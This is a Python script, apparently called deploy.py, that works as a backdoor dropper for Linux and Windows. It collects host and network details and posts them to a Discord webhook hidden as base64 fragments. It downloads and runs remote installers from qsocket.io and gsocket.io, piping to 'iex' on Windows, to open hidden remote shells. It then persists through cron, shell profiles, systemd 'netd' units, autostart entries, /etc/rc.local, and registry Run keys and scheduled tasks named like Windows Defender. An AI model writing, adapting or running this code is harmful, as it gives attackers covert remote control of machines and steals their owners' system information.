import os, sys, random, string, subprocess, platform
import socket, json, base64, urllib.request, ssl, time
from datetime import datetime

# ── utils ─────────────────────────────────
def gen_secret(n=22):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def is_win():  return platform.system().lower() == 'windows'
def is_lin():  return platform.system().lower() == 'linux'
def is_root():
    try:
        return (os.geteuid() == 0) if is_lin() else \
               __import__('ctypes').windll.shell32.IsUserAnAdmin()
    except: return False

def acquire_lock():
    try:
        import fcntl
        lf = open('/tmp/.dp.lock', 'w')
        fcntl.flock(lf, fcntl.LOCK_EX | fcntl.LOCK_NB)
        lf.write(str(os.getpid())); lf.flush()
        return lf
    except: return None

# ── system info (one-liners compactos) ────
def _run(*args):
    try: return subprocess.run(list(args), capture_output=True, text=True).stdout.strip()
    except: return 'N/A'

def _read(path, key):
    try:
        with open(path) as f:
            for l in f:
                if l.startswith(key): return l.split(':', 1)[1].strip() if ':' in l \
                    else l.split('=', 1)[1].strip().strip('"')
    except: pass
    return 'N/A'

get_kernel  = lambda: _run('uname', '-r')
get_arch    = lambda: platform.machine() or 'N/A'
get_user    = lambda: os.environ.get('USER') or os.environ.get('USERNAME') or 'N/A'
get_shell   = lambda: os.environ.get('SHELL', 'N/A')
get_procs   = lambda: str(len([p for p in os.listdir('/proc') if p.isdigit()])) \
                      if is_lin() else 'N/A'
get_disk    = lambda: ' '.join(_run('df','-h','/').splitlines()[-1].split()[1:5:2] +
                                [_run('df','-h','/').splitlines()[-1].split()[4]]) \
                      if is_lin() else 'N/A'
get_ifaces  = lambda: _run('ip','-br','addr').replace('\n', ', ') or 'N/A'

def get_hostname():
    try: return socket.gethostname()
    except: return 'N/A'

def get_pub_ip():
    for u in ['https://api.ipify.org','https://ifconfig.me','https://icanhazip.com']:
        try:
            ctx = ssl.create_default_context(); ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with urllib.request.urlopen(
                    urllib.request.Request(u, headers={'User-Agent':'curl/7.88.1'}),
                    context=ctx, timeout=6) as r:
                v = r.read().decode().strip()
                if len(v) < 50: return v
        except: pass
    return 'N/A'

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80)); ip = s.getsockname()[0]; s.close(); return ip
    except: return 'N/A'

def get_os():    return _read('/etc/os-release', 'PRETTY_NAME') if is_lin() \
                        else platform.platform()
def get_uptime():
    try:
        s = float(open('/proc/uptime').read().split()[0])
        return f"{int(s//86400)}d {int(s%86400//3600)}h {int(s%3600//60)}m"
    except: return 'N/A'
def get_cpu():   return _read('/proc/cpuinfo', 'model name') if is_lin() \
                        else platform.processor() or 'N/A'
def get_ram():
    try:
        ls = open('/proc/meminfo').readlines()
        t = int(next(l for l in ls if 'MemTotal'     in l).split()[1]) // 1024
        f = int(next(l for l in ls if 'MemAvailable' in l).split()[1]) // 1024
        return f"{t-f}MB / {t}MB"
    except: return 'N/A'
def get_mac():
    try:
        import uuid
        return ':'.join(f'{(uuid.getnode()>>e)&0xff:02x}' for e in range(0,48,8))[::-1]
    except: return 'N/A'
def get_cron():
    try:
        ls = [l for l in _run('crontab','-l').splitlines() if l and not l.startswith('#')]
        return f"{len(ls)} entradas"
    except: return 'N/A'

# ── discord ───────────────────────────────
_w = [b'aHR0cHM6Ly9kaXNjb3JkLmNvbS9h', b'cGkvd2ViaG9va3MvMTUzNjIyNzEw',
      b'Mjc5NjQyMzI0OC91RVFH',         b'bFV4Q3lkazZfY1FVSF90',
      b'ZDlRTXBFeko0ekZSYjBw',         b'SjZDMUFmX0x6NzJLVDZk',
      b'ZEhoby1aeEtIbnFQV0da',         b'U041bg==']
def _ep(): return base64.b64decode(b''.join(_w)).decode()

def send_discord(title, ok, qs_secret=None, gs_secret=None):
    root   = 'ROOT' if is_root() else get_user()
    fields = [
        {'name':'Data/Hora',  'value':datetime.now().strftime('%d/%m/%Y %H:%M:%S'),'inline':True},
        {'name':'Sistema',    'value':get_os(),        'inline':True},
        {'name':'Kernel',     'value':get_kernel(),    'inline':True},
        {'name':'Arch',       'value':get_arch(),      'inline':True},
        {'name':'CPU',        'value':get_cpu(),       'inline':False},
        {'name':'RAM',        'value':get_ram(),       'inline':True},
        {'name':'Disco',      'value':get_disk(),      'inline':True},
        {'name':'Uptime',     'value':get_uptime(),    'inline':True},
        {'name':'IP Publico', 'value':get_pub_ip(),    'inline':True},
        {'name':'IP Local',   'value':get_local_ip(),  'inline':True},
        {'name':'Interfaces', 'value':get_ifaces(),    'inline':False},
        {'name':'MAC',        'value':get_mac(),       'inline':True},
        {'name':'Hostname',   'value':get_hostname(),  'inline':True},
        {'name':'User/Root',  'value':root,            'inline':True},
        {'name':'Shell',      'value':get_shell(),     'inline':True},
        {'name':'Processos',  'value':get_procs(),     'inline':True},
        {'name':'Crontab',    'value':get_cron(),      'inline':True},
    ]
    for tool, sec, cmd_bin in [('QSocket', qs_secret, 'qs-netcat'),
                                ('GSSocket', gs_secret, 'gs-netcat')]:
        if sec:
            fields += [{'name':f'[{tool}] Key', 'value':f'`{sec}`',        'inline':False},
                       {'name':f'[{tool}] Cmd', 'value':f'`{cmd_bin} -i -s {sec}`', 'inline':False}]
    try:
        ctx = ssl.create_default_context(); ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(_ep(), data=json.dumps({
            'embeds':[{'title':('[OK] ' if ok else '[FAIL] ')+title,'color':0x00FF00 if ok else 0xFF0000,
                       'fields':fields,'footer':{'text':f'deploy.py | {get_hostname()} | {get_user()}'}}]
        }).encode(), headers={'Content-Type':'application/json','User-Agent':'curl/7.88.1'}, method='POST')
        urllib.request.urlopen(req, context=ctx, timeout=10)
    except: pass

# ── download ──────────────────────────────
def download(url):
    try:
        ctx = ssl.create_default_context(); ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with urllib.request.urlopen(
                urllib.request.Request(url, headers={'User-Agent':'wget/1.21.3','Accept':'*/*'}),
                context=ctx, timeout=30) as r:
            c = r.read().decode()
            if c.strip().startswith('#'): return c
    except: pass
    for cmd in [['curl','-fsSk',url], ['wget','-q','--no-check-certificate','-O','-',url]]:
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if r.stdout and r.stdout.strip().startswith('#'): return r.stdout
        except: continue
    return None

# ── find binary (generico para qs e gs) ───
def find_binary(name, subdir=None):
    """Acha binario em subdir de ~/.config, PATH ou crontab"""
    # 1. subdir especifico (ex: ~/.config/.gsd/gs-netcat)
    if subdir:
        p = os.path.join(os.path.expanduser(subdir), name)
        if os.path.isfile(p) and os.access(p, os.X_OK): return p
    # 2. varredura em ~/.config/* (qsocket instala em dir aleatorio)
    config = os.path.expanduser('~/.config')
    latest, latest_t = None, 0
    try:
        for d in os.listdir(config):
            p = os.path.join(config, d, name)
            if os.path.isfile(p) and os.access(p, os.X_OK):
                t = os.path.getmtime(p)
                if t > latest_t: latest, latest_t = p, t
    except: pass
    if latest: return latest
    # 3. PATH
    r = _run('which', name)
    if r and r != 'N/A': return r
    # 4. crontab (deploy funcionou mas binario nao visivel via fs)
    r = _run('crontab', '-l')
    if name in r: return 'crontab'
    return None

# ── run deploy script ─────────────────────
def run_deploy(script, env, timeout=180):
    try:
        subprocess.run(['bash','-c',script], env=env, timeout=timeout,
                       stdin=subprocess.DEVNULL)
        return True
    except (FileNotFoundError, subprocess.TimeoutExpired, Exception):
        return False

# ── persistencia linux ────────────────────
def persist_linux(binary, secret):
    if not binary or binary == 'crontab' or not os.path.isfile(binary): return
    run_cmd  = f"{binary} -s {secret} -l -i -q"
    # pgrep -f sem -x (fix: -x exige match exato, nunca combina com path longo)
    check    = f"pgrep -f '{secret[:12]}' >/dev/null 2>&1"
    watchdog = f"{check} || (nohup {run_cmd} >/dev/null 2>&1 & disown)"

    # 1. crontab usuario
    try:
        cur = _run('crontab', '-l')
        new = cur.rstrip('\n')
        for e in [f"@reboot {run_cmd} >/dev/null 2>&1", f"* * * * * {watchdog}"]:
            if e not in cur: new += f"\n{e}"
        subprocess.run(['crontab','-'], input=new+'\n', text=True, capture_output=True)
    except: pass

    # 2. shell rc files
    for rc in ['~/.bashrc','~/.bash_profile','~/.profile','~/.zshrc']:
        try:
            p = os.path.expanduser(rc)
            c = open(p).read() if os.path.exists(p) else ''
            if secret not in c:
                open(p,'a').write(f"\n{watchdog}\n")
        except: pass

    # 3. systemd user service + loginctl linger (inicia no boot, nao so no login)
    for sd in ['~/.config/systemd/user', '~/.local/share/systemd/user']:
        try:
            d = os.path.expanduser(sd)
            os.makedirs(d, exist_ok=True)
            open(os.path.join(d,'netd.service'),'w').write(
                f"[Unit]\nDescription=Network Service\nAfter=network.target\n\n"
                f"[Service]\nExecStart={run_cmd}\nRestart=always\nRestartSec=30\n\n"
                f"[Install]\nWantedBy=default.target\n")
        except: pass
    try:
        subprocess.run(['systemctl','--user','enable','--now','netd.service'], capture_output=True)
        subprocess.run(['loginctl','enable-linger', get_user()], capture_output=True)
    except: pass

    # 4. XDG autostart
    try:
        ad = os.path.expanduser('~/.config/autostart')
        os.makedirs(ad, exist_ok=True)
        w = os.path.join(ad,'.netd.sh')
        open(w,'w').write(f"#!/bin/sh\n{run_cmd} >/dev/null 2>&1\n")
        os.chmod(w, 0o755)
        open(os.path.join(ad,'netd.desktop'),'w').write(
            f"[Desktop Entry]\nType=Application\nName=Network Manager\n"
            f"Exec={w}\nTerminal=false\nNoDisplay=true\nHidden=false\n"
            f"X-GNOME-Autostart-enabled=true\n")
    except: pass

    # 5. root: /etc/cron.d + /etc/rc.local + systemd system
    if is_root():
        try:
            p = '/etc/cron.d/netd'
            c = open(p).read() if os.path.exists(p) else ''
            if secret not in c:
                open(p,'w').write(f"* * * * * {get_user()} {watchdog}\n")
                os.chmod(p, 0o644)
        except: pass
        try:
            p = '/etc/rc.local'
            c = open(p).read() if os.path.exists(p) else "#!/bin/sh\nexit 0\n"
            if secret not in c:
                open(p,'w').write(c.replace('exit 0', f"{run_cmd} >/dev/null 2>&1 &\nexit 0"))
                os.chmod(p, 0o755)
        except: pass
        try:
            open('/etc/systemd/system/netd.service','w').write(
                f"[Unit]\nDescription=Network Service\nAfter=network.target\n\n"
                f"[Service]\nUser={get_user()}\nExecStart={run_cmd}\n"
                f"Restart=always\nRestartSec=30\n\n"
                f"[Install]\nWantedBy=multi-user.target\n")
            subprocess.run(['systemctl','enable','--now','netd.service'], capture_output=True)
        except: pass

# ── persistencia windows ──────────────────
def persist_windows(secret):
    ps_cmd = f"qs-netcat.exe -liqs {secret}"
    ps_arg = f'-WindowStyle Hidden -Command "{ps_cmd}"'
    ps_run = f"powershell.exe {ps_arg}"
    appdata, userprofile = os.environ.get('APPDATA',''), os.environ.get('USERPROFILE','')
    try:
        import winreg as wr
        for hive, key_name in [(wr.HKEY_CURRENT_USER,'WindowsUpdate'),
                               (wr.HKEY_LOCAL_MACHINE,'WindowsDefender')]:
            try:
                k = wr.OpenKey(hive, r'Software\Microsoft\Windows\CurrentVersion\Run',
                               0, wr.KEY_SET_VALUE)
                wr.SetValueEx(k, key_name, 0, wr.REG_SZ, ps_run); wr.CloseKey(k)
            except: pass
    except: pass
    try:
        subprocess.run(['powershell','-ExecutionPolicy','Bypass','-Command',
            f"$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '{ps_arg}';"
            "$t1=New-ScheduledTaskTrigger -AtStartup;"
            "$t2=New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 1) -Once -At (Get-Date);"
            "Register-ScheduledTask 'WindowsDefenderUpdate' -Action $a -Trigger $t1,$t2 -RunLevel Highest -Force"],
            capture_output=True, timeout=30)
    except: pass
    if appdata:
        try:
            s = os.path.join(appdata,'Microsoft','Windows','Start Menu','Programs','Startup')
            if os.path.isdir(s):
                open(os.path.join(s,'WindowsUpdate.vbs'),'w').write(
                    f'CreateObject("WScript.Shell").Run "{ps_run}", 0, False')
        except: pass
    if userprofile:
        try:
            p = os.path.join(userprofile,'Documents','WindowsPowerShell',
                             'Microsoft.PowerShell_profile.ps1')
            os.makedirs(os.path.dirname(p), exist_ok=True)
            c = open(p).read() if os.path.exists(p) else ''
            if secret not in c:
                open(p,'a').write(f"\nStart-Process powershell -WindowStyle Hidden "
                                  f"-ArgumentList '-Command \"{ps_cmd}\"'\n")
        except: pass

# ── deploy ────────────────────────────────
def deploy_linux(url, env_extra, timeout=180, wait=10):
    """Generico: baixa script, injeta env_extra, roda, retorna binario ou None"""
    script = download(url)
    if not script: return None
    env = {**os.environ, **env_extra}
    env.pop('WAYLAND_DISPLAY', None); env.pop('WAYLAND_SOCKET', None)
    run_deploy(script, env, timeout)
    time.sleep(wait)
    return None   # caller faz find_binary

def deploy_qsocket_linux(secret):
    deploy_linux('https://qsocket.io/0', {'S': secret, 'HIDE': '1'})
    return find_binary('qs-netcat')

def deploy_gsocket_linux(secret):
    gs_dir = os.path.expanduser('~/.config/.gsd')
    os.makedirs(gs_dir, exist_ok=True)
    deploy_linux('https://gsocket.io/y', {
        'X': secret, 'GS_NOCERTCHECK': '1',
        'GS_DSTDIR': gs_dir, 'GSOCKET_ARGS': '-l -i -q -D'})
    return find_binary('gs-netcat', '~/.config/.gsd')

def deploy_qsocket_windows(secret):
    try:
        subprocess.run(['powershell','-ExecutionPolicy','Bypass','-WindowStyle','Hidden',
            '-Command', f'$Env:S="{secret}"; $Env:HIDE=1; irm qsocket.io/1 | iex'],
            timeout=180, capture_output=True)
        time.sleep(10)
        appdata = os.environ.get('APPDATA','')
        if appdata:
            for d in os.listdir(appdata):
                if os.path.isfile(os.path.join(appdata,d,'qs-netcat.exe')): return True
        return 'qs-netcat' in _run('tasklist')
    except: return False

# ── daemonize ─────────────────────────────
def daemonize():
    if not is_lin(): return
    pid = os.fork()
    if pid > 0:
        sys.stdout.write(f"[*] pid: {pid}\n"); sys.stdout.flush(); os._exit(0)
    os.setsid()
    null = os.open(os.devnull, os.O_RDWR)
    for fd in (0, 1, 2): os.dup2(null, fd)
    os.close(null)

# ── main ──────────────────────────────────
def main():
    if acquire_lock() is None: return
    qs_s, gs_s = gen_secret(), gen_secret()

    if is_lin():
        daemonize()
        qs_bin = deploy_qsocket_linux(qs_s)
        if qs_bin and qs_bin != 'crontab': persist_linux(qs_bin, qs_s)
        gs_bin = deploy_gsocket_linux(gs_s)
        if gs_bin and gs_bin != 'crontab': persist_linux(gs_bin, gs_s)
        qs_ok, gs_ok = qs_bin is not None, gs_bin is not None
        send_discord(f"Linux | QS={'OK' if qs_ok else 'FAIL'} GS={'OK' if gs_ok else 'FAIL'}",
                     ok=qs_ok or gs_ok,
                     qs_secret=qs_s if qs_ok else None,
                     gs_secret=gs_s if gs_ok else None)
    elif is_win():
        ok = deploy_qsocket_windows(qs_s)
        if ok: persist_windows(qs_s)
        send_discord("Windows", ok=ok, qs_secret=qs_s if ok else None)

if __name__ == '__main__':
    main()
